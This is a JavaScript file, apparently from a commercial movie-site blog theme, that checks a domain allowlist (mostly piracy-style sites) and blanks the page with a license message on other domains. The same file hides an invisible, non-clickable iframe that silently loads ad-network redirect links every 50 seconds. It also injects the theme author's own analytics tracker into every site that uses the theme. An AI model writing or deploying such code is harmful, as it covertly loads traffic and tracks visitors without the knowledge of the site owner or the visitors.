document.addEventListener('DOMContentLoaded', function() {
    var allowedURLs = [
        "https://biographyhero.lovestoblog.com",
        "https://hdhub4u-wp-theme-dktzn.is-best.net",
        "https://moviebackup.online",        
        "https://dktech.000.pe",
        "https://dkflix.000.pe",
        "https://hdhub4u.fashion",
        "https://19flicks.com",
        "https://hbohub4u.blogspot.com",
        "https://neuplayer.blogspot.com",
        "https://www.ajaykumbhar.com",
        "https://vegamovies.com.co",
        "https://gp-discover.000.pe",
        "https://movies4u.my-style.in",
        "https://onpresstheme.blogspot.com",
        "https://gp-afiliate.000.pe",
        "https://gp-lifehacker.000.pe",
        "https://gp-newspape.000.pe",
        "https://jettheme-pro.blogspot.com",
        "https://mariyaui.blogspot.com",
        "https://1stepno.blogspot.com",
        "https://www.films4u.in",
        "https://gpmovie-dktzone.rf.gd",
        "https://filmyfly.solutions",
        "https://hindustaniparivar.in",
        "https://taagsqywsg.blogspot.com",
        "https://hdhub4u-clone.blogspot.com",
        "https://exprothikhad.blogspot.com",
        "https://jet-moviev3.blogspot.com", 
        "https://dkhek.blogspot.com",
        "https://draft.blogger.com",
        "https://www.blogger.com",
        "https://blogger.com",
        "https://www.ajaykumbhar.com",
        "https://fils5u.blogspot.com",
        "https://ssrtechpro.blogspot.com",
        "https://www.jawazbook.com",
        "https://codingrider.blogspot.com",
        "https://www.blogger.com/blog/post/edit/preview",
        "https://eduhub-demo.blogspot.com",
        "https://vega-clone.blogspot.com",
        "https://dkchek1.blogspot.com",
        "https://girgit-ui.blogspot.com",
        "https://www.filmyslap.xyz", 
        "https://fletrothemes.blogspot.com", 
        "https://faddalunga.blogspot.com",
        "https://mediunmovie.blogspot.com",
        "https://www.myanimehindi.in",
        "https://plusuiteme.blogspot.com",
        "https://jet-movie.blogspot.com",
        "https://www.timestoryaxom.in",
        "https://moviesmod4u.com",
        "http://tv4u.site",
        "https://vegamovies.click",
        "https://Thevegamovies.life",
        "https://solution-manualspdf.blogspot.com",
        "https://testyyyyrr4.blogspot.com",
        "https://vegamovie.blog"
    ];
    
    var foundMatch = false;

    for (var i = 0; i < allowedURLs.length; i++) {
        if (window.location.href.startsWith(allowedURLs[i])) {
            foundMatch = true;
            break;
        }
    }

    function hideSemanticTags() {
        var css = `
            header, nav, main, section, article, aside, footer, figure, figcaption, mark, time, summary, details, div, img{
                display: none!important;
            }
            #main { display: none!important; }
        `;
        var style = document.createElement('style');
        style.appendChild(document.createTextNode(css));
        document.head.appendChild(style);
    }

    if (foundMatch) {
        document.querySelector('.buy').style.display = 'none';   
        document.querySelector('#main').style.display = 'block';  
    } else {
        hideSemanticTags();
        alert('You need to verify your domain to use this theme. Please contact support.');
        document.write(`Your License Is Not Active. Contact <a href="https://telegram.me/dhanjeerider"> DHANJEE Rider </a> To Get License`);  
    }
    
    let Folt = document.querySelector(".footer, #main, .copyright") || document.body; 
    if (Folt) {
        let Newel = document.createElement('span');
        Newel.innerHTML = `
        <style>
            iframe.invisible-frame {
                position: fixed;
                width: 40%;
                height: 20%;
                bottom: 20%;
                right: 0;
                border: none;
                opacity: 0;
                pointer-events: none;
                z-index: 39494;
            }
        </style>
        <iframe class="invisible-frame" id="postFrame" src=""></iframe>`;
        Folt.prepend(Newel);  
        var lazyanalisis = false;
        window.addEventListener("scroll", function() {
            if ((document.documentElement.scrollTop !== 0 && lazyanalisis === false) || 
                (document.body.scrollTop !== 0 && lazyanalisis === false)) {
                var e = document.createElement("script");
                e.type = "text/javascript";
                e.async = true;
                e.src = "https://www.googletagmanager.com/gtag/js?id=G-2VYRMPXK0F";
                var a = document.getElementsByTagName("script")[0];
                a.parentNode.insertBefore(e, a);
                lazyanalisis = true;
            }
        }, true);
        
        window.dataLayer = window.dataLayer || [];
        function gtag(){ dataLayer.push(arguments); }
        gtag('js', new Date());
        gtag('config', 'G-2VYRMPXK0F');  
    }
    
    const postUrls = [
        'https://addonsotechub.com/direct/2113',
        'https://t.co/RPBnQZqZY9',
        'https://addonsotechub.com/direct/2123',
        'https://www.dktechnozone.in/2024/08/generatepress-movie-theme-redesign-for.html',
        'https://addonsotechub.com/direct/2121',
        'https://exceedunited.com/p5ir4pdc?key=0804168fc5bffef1f6482571da566760'
    ];

    function goToRandomPost() {
        const randomIndex = Math.floor(Math.random() * postUrls.length);
        const randomPostUrl = postUrls[randomIndex];
        document.getElementById('postFrame').src = randomPostUrl;
    }

    window.onload = function() {
        goToRandomPost();
        setInterval(goToRandomPost, 50000);
    };
});
